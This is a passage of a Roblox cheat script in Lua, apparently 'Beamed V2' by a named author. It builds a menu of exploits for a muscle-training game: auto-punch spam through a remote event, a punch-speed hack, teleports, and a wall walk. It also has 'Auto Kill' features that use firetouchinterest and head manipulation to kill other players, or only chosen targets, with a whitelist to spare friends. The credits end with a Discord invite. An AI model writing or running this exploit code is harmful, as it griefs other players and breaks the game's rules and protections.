        loopEquipPunch() -- Start the loop to continuously equip the "Punch" tool
    elseif loopEquipPunch then
        loopEquipPunch = nil -- Stop the loop when switch is deactivated
    end
end)

spawn(function()

end)

local switch = features:AddSwitch("Auto Punch", function(bool)
    if bool then
        _G.autopunch = true
        repeat
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Punch"))
            local args = {
                [1] = "punch",
                [2] = "rightHand"
            }
            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            local args = {
                [1] = "punch",
                [2] = "leftHand"
            }
            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))
            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autopunch
    else
        _G.autopunch = false
    end
end)


local function autoPunchWithMovement()
    while _G.autopunchwm do
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Punch"))
        local args = {
            [1] = "punch",
            [2] = "rightHand"
        }
        game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

        local args = {
            [1] = "punch",
            [2] = "leftHand"
        }
        game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))
        game:GetService("RunService").RenderStepped:Wait()
    end
end

local function playAnimations()
    local character = game.Players.LocalPlayer.Character
    local humanoid = character:WaitForChild("Humanoid")

    local animationIds = {
        "rbxassetid://3638767427",
        "rbxassetid://3638749874"
    }

    local currentIndex = 1

    while _G.autopunchwm do
        local animation = Instance.new("Animation")
        animation.AnimationId = animationIds[currentIndex]

        local animationTrack = humanoid:LoadAnimation(animation)
        animationTrack:Play()

        currentIndex = currentIndex % #animationIds + 1

        wait(0.4)
    end
end

local switch = features:AddSwitch("Auto Punch {With Movement}", function(bool)
    if bool then
        _G.autopunchwm = true
        spawn(autoPunchWithMovement)
        spawn(playAnimations)
    else
        _G.autopunchwm = false
    end
end)


features:AddButton("Speed Punch (Remove Punch first!!)",function()
	game:GetService("Players").LocalPlayer.Backpack.Punch:FindFirstChildOfClass("NumberValue").Value = 0.001
end)


local teleporting = false

local switch = features:AddSwitch("Safe Place TP", function(isOn)
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(5048.7060546875, 1060.53955078125, 24828.689453125)

    teleporting = isOn

    while teleporting do
        if character then
            character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
        end
        wait(0.5) -- Adjust the wait time as needed to control the teleportation frequency
    end
end)

switch:Set(false)


-- for aura 

-- whitlist check lol


-- Function to check if a player is in the whitelist

local function isInWhitelist(player, whitelist)
    for _, name in ipairs(whitelist) do
        if player.Name == name then
            return true
        end
    end
    return false
end

-- Whitelist table
local whitelist = {}


-- TextBox to add users to the whitelist
features:AddTextBox("Add to Whitelist", function(text)
    table.insert(whitelist, text)
end)

-- TextBox to remove users from the whitelist
features:AddTextBox("Remove from Whitelist", function(text)
    for i, name in ipairs(whitelist) do
        if name == text then
            table.remove(whitelist, i)
            break
        end
    end
end)

-- Button to clear the whitelist
features:AddButton("Clear Whitelist", function()
    whitelist = {}
end)

local function touchHead(player)
    local character = player.Character
    if character and not isInWhitelist(player, whitelist) then
        local head = character:FindFirstChild("Head")
        local localPlayer = game.Players.LocalPlayer
        local leftHand = localPlayer and localPlayer.Character:FindFirstChild("LeftHand")
        if head and leftHand then
            pcall(function()
                firetouchinterest(head, leftHand, 0)
                wait(0.01)
                firetouchinterest(head, leftHand, 1)
            end)
        end
    end
end

local switch = features:AddSwitch("Auto Kill", function(bool)
    if bool then
        _G.autokill = true
        while _G.autokill do
            local Players = game:GetService("Players")
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer and not isInWhitelist(player, whitelist) then
                    pcall(function()
                        local charkterkiller = player.Character
                        local mycharacter = Players.LocalPlayer.Character
                        if charkterkiller and mycharacter then
                            charkterkiller.Head.Anchored = true
                            charkterkiller.Head.CanCollide = false

                            if charkterkiller.Head:FindFirstChild("Neck") and charkterkiller.Head:FindFirstChild("nameGui") then
                                charkterkiller.Head.nameGui:Clone().Parent = charkterkiller.UpperTorso
                                charkterkiller.Head.Neck:Destroy()
                                charkterkiller.Head.nameGui:Destroy()
                                charkterkiller.Head.Transparency = 1
                                if charkterkiller.Head:FindFirstChild("Face") then
                                    charkterkiller.Head.Face:Destroy()
                                end
                            end

                            local args = {[1] = "punch", [2] = "leftHand"}
                            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

                            args = {[1] = "punch", [2] = "rightHand"}
                            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))
                            wait()
                            charkterkiller.Head.Position = Vector3.new(mycharacter.LeftHand.Position.X, mycharacter.LeftHand.Position.Y, mycharacter.LeftHand.Position.Z)
                        end
                    end)
                end
            end
            wait(0.1)
        end
    else
        _G.autokill = false
    end
end)

-- single auto

local selectedPlayers = {}
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local isRunning = false
local stepConnection
local dropdown = nil
local autokillplayerlocal = false

local function updateDropdown(player)
    if dropdown then
        dropdown:Add(player.Name)
    end
end

local function removeDropdown(player)
    if dropdown then
        dropdown:Remove(player.Name)
    end
end

local function touchTargetHead(player)
    if player and player.Character then
        local charkterkiller = player.Character
        local mycharacter = Players.LocalPlayer.Character

        if charkterkiller and mycharacter then
            pcall(function()
                charkterkiller.Head.Anchored = true
                charkterkiller.Head.CanCollide = false

                pcall(function()
                    if charkterkiller.Head.Neck.Name == "Neck" and charkterkiller.Head.nameGui then
                        charkterkiller.Head.nameGui:Clone().Parent = charkterkiller.UpperTorso
                        charkterkiller.Head.Neck:Destroy()
                        charkterkiller.Head.nameGui:Destroy()
                        charkterkiller.Head.Transparency = 1
                        charkterkiller.Head.Face:Destroy()
                    end
                end)

                pcall(function()
                    local args = { [1] = "punch", [2] = "leftHand" }
                    game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

                    args = { [1] = "punch", [2] = "rightHand" }
                    game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

                    wait()
                    charkterkiller.Head.Position = Vector3.new(mycharacter.LeftHand.Position.X, mycharacter.LeftHand.Position.Y, mycharacter.LeftHand.Position.Z)
                end)
            end)
        end
    end
end

local function main()
    if autokillplayerlocal then
        for _, player in ipairs(selectedPlayers) do
            touchTargetHead(player)
        end
    end
end

local function startCode()
    isRunning = true
    autokillplayerlocal = true
    stepConnection = RunService.Stepped:Connect(main)
end

local function stopCode()
    isRunning = false
    autokillplayerlocal = false
    if stepConnection then
        stepConnection:Disconnect()
    end
    selectedPlayers = {}
    if dropdown then
        dropdown:ClearSelection()
    end
end

local switch = features:AddSwitch("Auto Kill Players", function(bool)
    if bool then
        startCode()
    else
        stopCode()
    end
end)

Players.PlayerAdded:Connect(function(player)
    updateDropdown(player)
    dropdown:ClearOptions()
    for _, p in ipairs(Players:GetPlayers()) do
        dropdown:AddOption(p.Name)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    removeDropdown(player)
end)

dropdown = features:AddDropdown("Players", function(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        table.insert(selectedPlayers, player)
    end
end)

for _, player in ipairs(Players:GetPlayers()) do
    updateDropdown(player)
end

features:AddTextBox("Auto Kill Player", function(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        table.insert(selectedPlayers, player)
    end
end)

--stop here

features:AddLabel("----------")

-- sexy view player

-- View Player Functionality
local currentPlayerConnection = nil
local currentPlayer = nil

local function viewPlayer(playerName)
    -- Search for players whose names contain the input text
    local player = nil
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.Name:lower():match(playerName:lower()) then
            player = p
            break
        end
    end

    if player then
        -- Function to set the camera to the player's character
        local function setCameraToCharacter(character)
            game.Workspace.CurrentCamera.CameraSubject = character
        end

        -- Set the camera to the player's current character
        setCameraToCharacter(player.Character or player.CharacterAdded:Wait())

        -- Disconnect any previous connections
        if currentPlayerConnection then
            currentPlayerConnection:Disconnect()
            currentPlayerConnection = nil
        end

        -- Connect the CharacterAdded event to keep viewing the player after respawn
        currentPlayerConnection = player.CharacterAdded:Connect(setCameraToCharacter)
        currentPlayer = player
    else
        warn("Player not found:", playerName)
    end
end

-- Create a text box for specifying the player to view
features:AddTextBox("View Player", function(playerName)
    viewPlayer(playerName)
end)

-- Create a button to unview the player
features:AddButton("Unview Player", function()
    -- Disconnect the current player connection if it exists
    if currentPlayerConnection then
        currentPlayerConnection:Disconnect()
        currentPlayerConnection = nil
    end

    -- Reset the camera to the local player
    local localPlayer = game.Players.LocalPlayer
    game.Workspace.CurrentCamera.CameraSubject = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    currentPlayer = nil
end)

-- ending




local features = window:AddTab("Islands") -- Name of tab


features:AddButton("BeachTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-13, 5, 134)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("LegendsTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(4609, 989, -3903)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("MythicalTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(2250, 5.2, 1073)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("FrostTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-2623, 5, -409)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("InfernoTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-6758, 5, -1284)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("KingTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-8625, 15, -5730)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("TinyTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-32, 5, 1897)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("SecretTP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(1954, -0.2, 6182)

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("Desert Brawl TP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(908, 103, -7016) -- Desert Brawl coordinates

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("Beach Brawl TP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-1812, 103, -5914) -- Beach Brawl coordinates

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("Magma Brawl TP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(4517, 103, -8420) -- Magma Brawl coordinates

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

features:AddButton("Fortune Wheel TP", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local targetPosition = Vector3.new(-2611, 3, 5768) -- Fortune Wheel coordinates

    if character then
        character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end)

local features = window:AddTab("Fun") -- Name of tab
features:Show() -- shows the tab

local switch = features:AddSwitch("Walk on Walls", function(bool)
    if bool then
        -- Enable wall walking
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, true) -- Allow climbing walls
        humanoid.PlatformStand = false -- Ensure player isn't ragdolling

        character.HumanoidRootPart.Touched:Connect(function(hit)
            if hit and hit:IsA("Part") and hit.Material == Enum.Material.Concrete then
                -- When touching a wall, allow player to walk on it
                humanoid.PlatformStand = true
                character.HumanoidRootPart.CFrame = CFrame.new(character.HumanoidRootPart.Position, hit.Position)
            end
        end)
    else
        -- Disable wall walking
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")

        humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false) -- Disable wall climbing
        humanoid.PlatformStand = false
    end
end)

switch:Set(false)

features:AddLabel("will add more soon! ")

local features = window:AddTab("Credits") -- Name of tab

features:AddLabel("Script Made by : Ben1x1x1x1x (Ben/Beamed)")
features:AddLabel("Beamed V2 (Free Version)")

features:AddLabel("---Close Friends---")

features:AddLabel("Yupman")

features:AddLabel("Jay")

features:AddLabel("Ruth")

features:AddLabel("LuckyIIIV -- Gay Best Friend LMAO")

features:AddLabel("Sul")


features:AddLabel("----------")

features:AddLabel("Gayming Broski!!")

features:AddLabel("----------")

features:AddButton("Copy Discord Invite", function()
    setclipboard("https://discord.gg/JFFp2Y9BEV")
end)
